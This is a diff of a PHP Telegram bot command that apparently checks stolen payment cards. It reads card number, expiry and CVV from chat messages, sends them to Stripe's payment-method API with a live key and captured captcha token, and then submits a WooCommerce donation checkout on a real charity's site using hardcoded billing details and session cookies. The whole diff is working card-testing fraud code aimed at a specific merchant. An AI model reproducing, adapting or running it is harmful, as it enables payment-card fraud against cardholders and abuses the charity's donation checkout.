@@ -1922,7 +1922,6 @@ editMessage($chat_id,$respuesta,$id_text);
 elseif((strpos($message, "!fa") === 0)||(strpos($message, "/fa") === 0)||(strpos($message, ".fa") === 0)){
 
 $lista = substr($message, 4);
-//$i     = explode("|", $lista);
 $i = preg_split('/[|:| ]/', $lista);
 $cc    = $i[0];
 $mes   = $i[1];
@@ -1930,34 +1929,20 @@ $ano  = trim(substr($i[2], -2));
 $cvv   = $i[3];
 
 $bin = substr($lista, 0, 6);
-////
-$num = "$cc$mes$ano$cvv";
 
-$verify = substr($cc, 16, 1);
-if($verify != ""){
-$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
-sendMessage($chat_id,$respuesta, $message_id);
-die();
+$longitud = 4;
+$partes = [];
+for ($i = 0; $i < strlen($cc); $i += $longitud) {
+    $parte = substr($cc, $i, $longitud);
+    $partes[] = $parte;
 }
-
-if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
-}else{
-$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /fa cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !fa cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .fa cc|m|y|cvv\n";
-sendMessage($chat_id,$respuesta, $message_id);
-die();
-}
-
-
 //----------------MENSAGE DE ESPERA-------------------//
 $respuesta = "<b>🕒 Wait for Result...</b>";
 sendMessage($chat_id,$respuesta, $message_id);
 //-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
 $id_text = file_get_contents("ID");
 //----------------------------------------------------//
-
-$startTime = microtime(true); //TIEMPO DE INICIO
-$BinData = BinData($bin); //Extrae los datos del bin
-	
+/*
 //RANDOM USER//
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
@@ -1982,51 +1967,21 @@ curl_close($ch);
         preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
         $postcode = $matches1[1][0];
 
-
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://facesandvoicesofrecovery.org/engage/donate/',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'wordpress_logged_in_508923f30af7c37ea20c1d6887bb80bd=carlos.perez%7C1731729744%7Cp7KAvNle7Z1J9WwkLyQ4PTMeq1zNEmuc8436DoPO1Gc%7C358a3a02a21c66e436aeb6c84464c7c513b7cb769cf0952f36dd1cb596190913; wfwaf-authcookie-084fa67f8cdb5120d8f1ead9606207d0=19092%7Cother%7Cread%7Cd3fc84ddf757273bc068194acf1e986b13cb094ebcc3ce59dbd6f46031f024ea; woocommerce_items_in_cart=1; woocommerce_cart_hash=c73fc674d47101bf3c9ebdaef484e9dc; wp_woocommerce_session_508923f30af7c37ea20c1d6887bb80bd=19092%7C%7C1731724262%7C%7C1731720662%7C%7Ce40ce29008ab8337ffd6a94f35e07914; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-14%2002%3A29%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-14%2002%3A29%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8398605-f154-4877-b187-a7cee3a338b74c2226; __stripe_sid=8fbaf3a4-34e1-4d60-8833-357ce1408ef8e06a35; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fengage%2Fdonate%2F',
-  CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
-    'sec-ch-ua-platform: "Android"',
-    'upgrade-insecure-requests: 1',
-    'accept-language: es-US,es;q=0.9',
-    'referer: https://facesandvoicesofrecovery.org/',
-  ],
-]);
-
-$response = curl_exec($curl);
-$err = curl_error($curl);
-$patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
-preg_match($patron, $response, $coincidencias);
-$nonce = $coincidencias[1];
-curl_close($curl);
-echo "$nonce\n";
-
-
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
+	*/
+$cc = implode('+', $partes);                               $curl = curl_init();                                       curl_setopt_array($curl, [                                   CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'billing_details%5Bname%5D='.$name.'+'.$last.'&billing_details%5Bemail%5D='.$email.'&billing_details%5Bphone%5D='.$phone.'&billing_details%5Baddress%5D%5Bcity%5D='.$city.'&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bline1%5D='.$street.'&billing_details%5Baddress%5D%5Bline2%5D=&billing_details%5Baddress%5D%5Bpostal_code%5D='.$postcode.'&billing_details%5Baddress%5D%5Bstate%5D='.$state.'&type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F04e5aa74c1%3B+stripe-js-v3%2F04e5aa74c1%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ffacesandvoicesofrecovery.org&time_on_page=37795&client_attribution_metadata%5Bclient_session_id%5D=7f391aa9-babf-49ee-a397-86e12a599308&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=a236ec11-4754-46eb-9c61-23ad7766e882872b7b&muid=e8398605-f154-4877-b187-a7cee3a338b74c2226&sid=8fbaf3a4-34e1-4d60-8833-357ce1408ef8e06a35&key=pk_live_51EkCnzKp81anl5QIKzwBcjWRkc7CcluE8E7Y8ruaRVcOd5ATfw8Ian4jgMhds0gVbhGo6fRie8IQbm4znjUeblBA00HrWAWM5Y&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoicWppT25DcXZGYVBOMmJHMUhIWjBVdXFoM1lGRERXU1Z2NE9nNVQzTlpzVkJzSFdWeTJKeEdzS2dya0szb2ZhSTZwWEdCM2JEZUxySDNxTG5sMXlmWWZQNUhvTUlINy9BOHVBa3lhd05LV1lSU1VyZ2ZtRWJoZHdaZXVtYmJveUlPSGFZcjJJYmlRTDFSNXM4YStWdGEzWStHYUEydWFSeW1VY2ZEYk9aWEdRVkVUcGhrS0VlSERnK3BGVVJyZ3NzMG1nL0NCNkZhYlZkSmFLSEpCaWhBMVVGYXNVYVliRS8yaFEwNi9Kd1NDRjM4YlM4WDVQNmZrUjFhT1JKVUUvK0ljOEM0M0NSZWI0dEtQdmNaZjZmdCtzMzhZdEdZc3RHRThTWjdWdFRMVzMwRkhFcCtnOU5PRGhGa3lZYmpPTGZobDFFUkRrWlhOc0JJTVhjQURJU1ZhbzFLSW10TS8xWXBIeXQ1SzRxd2ZOSTE4eEJ5WVdmKzZqWWc2eE9Kc1VCcUVWam5YclZlMUFJT0FsaU1iOUtrTzdONDV2N3l0a3ZWbEpUVldXVkhhNjE1akUwYUw0cEhKdTZRcDlnN3VIQzhoL0hrUnRJQno1UEhZT21GYWNUYzJGUit6MllmZXAyL21VVEdwNGo4SjVQU0dBM0dSekhmeUlSMEk2VTFiL1lwSGIwMG9UckkvL1g4TjZ1T09MSUVxU0kwckN5eTE0V0FSSkhoTHBnaERXNWRUKzB5SXAzblNoWnUreVZ1SFlybFlRY1djeXY1TFhLQXNhc0h6aW1TTUdJeERTWEx1U1crRjVPcDBHRmcvZjRiclYySjdJQTRQb3NzbVN2dE5odUNCbVJma2hBRkxUbzZXNHZ0YTlrSERoNUNEVlRQYU9lQWxMMm5NQ0kxRUZadHNDUFZvUzZmcGpSSXNqZ2U0QmFablZtbTB4UmlkY2wwazlDdXBZZWZKczc3VXc1dktLdFdkakR5YmNIaGRmUUhvN1FvS2tYdkl3YXN5ckFkZ2lZYnhyWUNzd2wrR09sWVljd2RvVU8xMVpEZDVYazZQNFRMeTEwV3pkeXRmTWl2ZkZBQnFaZlFvQTNLYjlWaXNYMFVZMnoxTFhkS0s4a2IzVUhJTmVoR3FwdnllZDBzVVlvdmE2VlFBZnZZSDZUbVZoS0NYdDhGN0xmQXEvK3h2eWlXV3IraXB0elFERnpsM1gwWm5JemMyejhXZFpZQWVucnBXYXNuMzhpQnJPZlFkZVcrd3ZxNkdEczRpM1p5QTc1VHNTSjJzMGQvY04yRi9Oci8rMm5MNUlkelNmcWNMeGEvT2ZBeGlEVDUvODdjdFF4b0d3bVhoemNxaGR4TG5jdXpZcGtPN1NnWWF4SzZ1aFFYbklDckg5MWhnRWp2bTRRTXZEZnRweW9hbDRESURSSmlhNUt0cnQ3bXdUMWdDdFllWFE2cjRQYkxpMm5ZTEF4ZUtPSzI2NzhsbjB0YVB4UEFDSDlDOXJ6aHh0ZkN6VXZ3cHBObTAyWmFKREFDZHJud01tQ0xkSER3bExGdUxQQkJKN2N6S2huK09PM3hUcmlBcXY3SzVrcjVPWnJHN0RxWDdFZy80MXFnc2MzeEd4QzAyR3NDL1NqMTBudWl4ZXd3TGpuQ3d3U2FnK2FvbEc0SHQxVVVsQ29pbXluNU5nQUFlVmZnaUFjc3RaZjBJYTdFb3JVeVJtZk5mbURjUTBlTG5UckRlaWZDSy91Ty94d0xkN0szM2NkbTMzRS9iMW9SMmFqazM3VUNtUFR0SC9kVjhpV21mSGtJbUg1bmNoOXNYQjl0cGhRQ2ZiQmZXaE01ZGZ2ODNIb2NtSHU2ckVtQ2puU1kyVTdITFZYQUw5TWh1R3NVSVdjcUlaeVJoYWtZZGJwcG1NV3cvY1pVODNkY1V6T2dmK2ttQ3dyckFTK1FQMUVzRHVNTWdFNy81WVdDSjFsM0RvMTBGc3grdk9OcmYyMFRjTlhMTXdqQVpDWm1jOEZXQWR2T3dEcFlCeFlGNW8yRFRQa0doa1lPWmVFdHp5dHV4ZU84a2UvRHQzbFBPZTR2WUNBRkJ5ekxBakVSVVoyRGlod1hDQlUrQ0lJWkVpb1RCOFZ6WUJwSFF5UzNtU09QVUVndnoyc3Ezb1NqWVB1QS9GbzBjRGYxNEpLbWh1UWZHaHRkS0xaazlNYU9WUWpMcFIvZU4rOFVKRDlvaW8zc2psVkdWNXdnbDZ3WUdrb2s0bXNjblRMY0EyQXBIMkdTOWFBbkZvM3I4VUpSRU01eXNlcUlkVVkzUEZNVEs4cmhIdWkwTVdDTU9MbUpZMm9tYnMwTEthMXhOVHNOQkhsajB6RFZ4KytUREYrQTBXWTh6UTY0VHdRUWdJZEtuK2hOVk1kVGF4bDJCbTRlOUdSN2h1eDRpVmVpanRYOEhSenpISElWemJGVG5FSk1qYWMyY282My9PeU44TmRKNXpvL2pTQ3F4NTdudkNZQk1kTXpPVzVTLzh5eEY4MWJnNkVOZmJxUm9FWWcrQWcvR0czQlZNZk92L1UxUUVSS0VnbmJLeFkrc25VZDhYRTErcXd0aU1qUFBkZGVZVWc5dWVtaG9qYkxUSFBHOGVaeHRXdzg4WkFQMGZINTUvVE8waGwweHBuOXNJeEZ6bjhjRDdDZUo2Vk42bFhIZWExZXJnMnJBMVY1d1p2TGFaSmNGeTlEdWhBTnZlNFBMVjlFdTFhNzlFRzNCenZtVGhFc09IcjVFSVVGczc0bUs2MEJmMGZsaFVnSThNQ3ZWMTZsK2pXQis3YU5rdkQ5YmM9IiwiZXhwIjoxNzMxNTUxNzAwLCJzaGFyZF9pZCI6MjIxOTk2MDczLCJrciI6IjMzMzVjMSIsInBkIjowLCJjZGF0YSI6IkdLVTB4N21vdFd5YnhYK3dTMUtXZkxIWXU3TlJBNUllVGJUaUt1eW53MUtPMkc4ZDB4Vk1ZS1lWbi81bTZNemNwaTVDMVV6c2ZsMytQbmF5dGR5VXkxbkVsdXJVcHMwYkhJbnMxZ0tVRzhscER5ZCthT204cFdxVjdWRVBNRCt6YldSRkxkQjFVYXpiVWEvMnJhcndvM2lYamRnbThhNThkc0V0RWFPNTk5U3pQZDZEaXRzTlZkM25kcXBidTJ1ZVJlczY1SVhXK1cxUXovZjcifQ.oRAkXNy3jstOMy0hGz7Bm9lXwT7H9KOSp-u7V_pfy5A',
+  CURLOPT_POSTFIELDS => 'billing_details%5Bname%5D=Carlos+Perez&billing_details%5Bemail%5D=Dausitherer%40paruz.de&billing_details%5Bphone%5D=4179204022&billing_details%5Baddress%5D%5Bcity%5D=New+york&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bline1%5D=6195+bollinger+rd&billing_details%5Baddress%5D%5Bline2%5D=&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&billing_details%5Baddress%5D%5Bstate%5D=NY&type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fab4f93f420%3B+stripe-js-v3%2Fab4f93f420%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ffacesandvoicesofrecovery.org&time_on_page=58691&client_attribution_metadata%5Bclient_session_id%5D=b1ce9aed-1417-4e80-86b3-9158d1650afa&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=32fd16d7-5922-47b3-9be1-f31c19df298a81e413&muid=9b1a0ea1-0156-4186-9458-c4e8fe27376f75e12a&sid=e8d0ef65-cbfe-4a06-980f-007ab0e3293d922cf1&key=pk_live_51EkCnzKp81anl5QIKzwBcjWRkc7CcluE8E7Y8ruaRVcOd5ATfw8Ian4jgMhds0gVbhGo6fRie8IQbm4znjUeblBA00HrWAWM5Y&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoib29iWkU4bGw2K1U1Z1UwYmhaOUFEOWR5dnVnUno0WHZtQTdzeWEzYWxvWHhRMGJNSTRXeFdZc2FWQ2NkRytHUi81R0hpSUphSVRQeGhDZmhhcC9JMmI2NjRkWnIrZUtEQkxtWm1MN1BQOHpscVF2NjdFbVBnZ1ZxalFEc0xPbXBnU0JkRlJ5UHdpNi9mYjY0YzExSEFUMk95aUZ2UGtlek0zamhxRkYrYk1mYk1KaTZ4QUdGNVF0QWp5VmRKOThMREtPL0ZXc0d5ZWpqTVNZNVFvbktTOTBPaGJ4NTlDTEgwcUlyYmhFN1JpN3h0S0k4YmpvaFc3M2Z6UHVvdXFQQ1NEanNWaEoyS1d2ZTVVL3FuSk8zOStCWUQ5cmpWRXZ1Y01FYkljclRYWEM5NSttZWpIaG0rNDB1MU9ra3o1UWNiYmF0T0EyNUw5WXNzMmZUbW9SZTBUT3dSRzBmUyt2STdtMU9Kb2hjbElFeWFmR08rMWQ1b2thL2xQQjU2VCtuNnp3R1M4MG1JckdEYWlkWVJSVnhyeVdIUDBNcnlmL2NGUDR0aUZEMDVFblZpUVNkdTQ4VTB6SUtlQjRwUG5Mem1vYUZPcXAzNDZFaTJ0Q2I0Ty9FR1BFaVZ3ZkVIRUp5c0RVUTdBcUhzSUZYR2NDK3pZZklzTzlHcm5qOEFWZ0ZqRHd3VXl0QnY5a0djc0NGVFFYOVIvSzhrc01IT2dvRzhyZTBUN01jZWYxa0Fjc2NQNEhUVkYyRTlScllsWEZFM0hQZUlRczR5U0Npem8xWFRxamFaNURnb3VERTluMUhSYVk3amtvaUFzZmVvTmF3Q2psVEdjemRCdUZUNjBFajV1bUZ6a1Vyci82VFdPSVhOcXF4WU5YTm55TkN5eU1UU0c5c1A2bjMwcWk4dENTdExnMjd3Zi90MzlmTldnUlV6c1RlOVBXaXZQZGtrQ2M2WGw5bE1WZ0MvT256c2s3S2tWYklxekJBWGdXTTRlZ3hzYlYrcTNOdmluN2JLUDdJZWUyRWdpaGtYOE9qVjdlejkyZ0ZPVFprdFdWNi9xaTNOU0cxS2dGWjBZTDlFYjU4cW9MRlU4cjJhcGFGTnZUWGp5aEhidVBTVFkvVk9TOXBkRnM5T1NRb3FaWWJGRERoeTJtYXNGNWlGRTZ3cXF3MHdWOCtxY1hrVHpia1lpazJMQXYxSVZsWkZBRDhpRjZ2ZGRuUmJNcGdsOC8ySUZBVmhhZ2ZRdTBFR1laQ0ZoOHFQRE9sK1pBK1dIR1g5bXhuTnkrbUhYV3dEbmk2S2x4SktFbFB2MzRPV3ZVQ0IreVF5NGxrU21Qc1RRMUh2SHh4RDRpM0tJcnRIeHRML25LTUJVVXVPN1lxTGQ4NS9sYlRZY1dhcWdxNEs4cjYraDBPNDZLS25YNDVMVS9qMkkvQllpVksvand2VTBBejhnTXo0c3FhUVBmM1MrVExmaDc2MWE2cHJDNDVQOTF3V01GdGVubGd4b2JPMHQ0cG0vV0Z1blVhZ0hUVDRLL3pBWEZ4YjBRMmtIb2lDVUFqLzcvMmVMYm9wclU5dkNrSnFWVklxVnhmaERGN1JISE96NHNBWDQxRWk1bDVKM0Y4TXhOODhPdmxtNHVjTWtxVnlPbzlMNjhKYndWTzMzbldFVFFZSW1RWkVGK2R4bmlFMVJaVllFdnlTUkpud1B3OGNYQ1FxZjdPZXREc2VVUTZObEloV0crUnlIRWt2RVBGWGp1Um5lYTVsWGlkNFZ3UnJRWjJSUENpakxMYVhEMFFRUTNzaWVZRTNVSVR2ODFTVXZhUlhhakZENjJPMnIvVDZZYXlSL0VLdURicUJKZlFwUVhxc2o4QVZsL0JwL1RteVAzM1dHMU80bGZqQUdJeURwMmltR0I0cjRRREFRNThTMjU3VkwzdC96WXQwQ0lhN2RHY1lRRVR5V1JkN1MvWHliNXdRQzdvTytVa01yU3p2QTlJSVYxS21rNlRvdHR3OTZ5TlBHcXY1N3Jzc1pXeDdsUUZ3ajRtRlYwWGtkSnQ3SXBlMVdBNmpNY3c5VEtnWjFEbmVteGtyMDdzcGN1TkhlKzcwTlcybjdFK1Jwbjh1dHlzZ0RHektZVW5UY1d6eWtRc1N6Qm9GVFdBUS8vY3hVWlozVDBJRzY3WlFTSS8raWVTV0hPczN1aXBxbml5UWs3Q0NKckk3OU1TVFNTUEREbjRPK0QrY3lHd04xTk9hdVBvcUswNGRNQ3JwY1ZyWHVrSS9kanM2NC9OamYwZkVQenhNY2FzRlhTaVBrY0xTVDlkcU45Q3ZzSEFlYnphR0pRTFBLN1I4UlRPaVEzakR3M3htdTEycGxWM1Y4Ui9KdktrZzUzV1l4eHRvVVpvYW9ENVlXeG5acG8vb0wyVWdnVGw0RjlacnlsaW15bmk2QkZsTm9oSmRRQlo2TUw1ZWlHejAvWTdOL3ZTWTJaUlNHcEc3T1hITmpFbjZwZ0N4OTVQMVNhRG1IaWNMMTZhN3hheDQwblRtaTZaSTdGUW54dlZtdGlpR3F3dUh4NnNZRUZUaHNIZW83b3A5Nm9QVUI2a3MzeTRuRHVwY1M2ekM1V1pEOFNLbFExbWNKTGh3Ukd0UEZtSkVvZlZkVlVFVEM0djNMdU5taklzamdoZnc2aEgzdFJFTXpkVHRhamNXa0JxcmNIWHo1UzZiRkxRVnZjLzhnbUlsMU9DcmU2SzlSdU53Y0NxVDVZbmJ5V05HdWpTSCtSWGh3RHRlbEdXdmNVb1dpanFneTN0ZmwvNDZhNm56dHRCWDFmbHNBQWVnOXRzYnc9PSIsImV4cCI6MTczMjk5NzUwNCwic2hhcmRfaWQiOjIyMTk5NjA3Mywia3IiOiIxZmQ3Mzk2NSIsInBkIjowLCJjZGF0YSI6ImRyaWpFeGIyRHRPaXExd3VSYmJRY1VGbm9NR2dHdExKSEZjVFVyTUpuekRwVFUwSlh3NmtQalgycVRmWFBFUG5EbDBSYWpsbU83TzBPcjhKMU9jTnZ4NHNyN1czWmpJeXlMMFlndlprdGdIVTVWVU5uM25tNU5QeitNV0dWY3FSNlBzM0RSREwrWmozR2pnSVc3a3cyakxXQjhjQWhTMVpnWmdmZzBMYzVGbUFSbTMvQmxzM21tSUdaaXVlS0J4bi9VSzlEdDRxYXhZK0lkMnUifQ.c6iH8NK4YkuMf1r4mw9gDv6OWagGr0cIpjl4k4xBFfk',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'Accept: application/json',
     'Content-Type: application/x-www-form-urlencoded',
     'sec-ch-ua-platform: "Android"',
-    'accept-language: es-US,es;q=0.9',
+    'accept-language: es-US,es;q=0.7',
     'origin: https://js.stripe.com',
     'referer: https://js.stripe.com/',
   ],
@@ -2038,11 +1993,9 @@ $json = json_decode($response, true);
 $id = $json["id"];
 curl_close($curl);
 
-echo "$id\n";
 
 
 $curl = curl_init();
-
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://facesandvoicesofrecovery.org?wc-ajax=checkout',
   CURLOPT_RETURNTRANSFER => true,
@@ -2051,64 +2004,31 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F&wc_order_attribution_session_start_time=2024-11-14+02%3A29%3A54&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F130.0.0.0+Mobile+Safari%2F537.36&billing_email='.$email.'&billing_first_name='.$name.'&billing_last_name='.$last.'&billing_company=&billing_country=US&billing_address_1='.$street.'&billing_address_2=&billing_city='.$city.'&billing_state='.$state.'&billing_postcode='.$postcode.'&billing_phone='.$phone.'&fvr_wc_donation_in_honor_of=&order_comments=&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&wc-stripe-new-payment-method=true&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method='.$id.'',
-  CURLOPT_COOKIE => 'wordpress_logged_in_508923f30af7c37ea20c1d6887bb80bd=carlos.perez%7C1731729744%7Cp7KAvNle7Z1J9WwkLyQ4PTMeq1zNEmuc8436DoPO1Gc%7C358a3a02a21c66e436aeb6c84464c7c513b7cb769cf0952f36dd1cb596190913; wfwaf-authcookie-084fa67f8cdb5120d8f1ead9606207d0=19092%7Cother%7Cread%7Cd3fc84ddf757273bc068194acf1e986b13cb094ebcc3ce59dbd6f46031f024ea; woocommerce_items_in_cart=1; woocommerce_cart_hash=c73fc674d47101bf3c9ebdaef484e9dc; wp_woocommerce_session_508923f30af7c37ea20c1d6887bb80bd=19092%7C%7C1731724262%7C%7C1731720662%7C%7Ce40ce29008ab8337ffd6a94f35e07914; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-14%2002%3A29%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-14%2002%3A29%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8398605-f154-4877-b187-a7cee3a338b74c2226; __stripe_sid=8fbaf3a4-34e1-4d60-8833-357ce1408ef8e06a35; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fengage%2Fdonate%2F',
+  CURLOPT_POSTFIELDS => 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Ffacesandvoicesofrecovery.org%2F&wc_order_attribution_session_start_time=2024-11-30+20%3A04%3A22&wc_order_attribution_session_pages=11&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F131.0.0.0+Mobile+Safari%2F537.36&billing_email=Dausitherer%40paruz.de&billing_first_name=Carlos&billing_last_name=Perez&billing_company=&billing_country=US&billing_address_1=6195+bollinger+rd&billing_address_2=&billing_city=New+york&billing_state=NY&billing_postcode=10010&billing_phone=4179204022&fvr_wc_donation_in_honor_of=&order_comments=&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&wc-stripe-new-payment-method=true&woocommerce-process-checkout-nonce=97fee7c96d&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method='.$id.'',
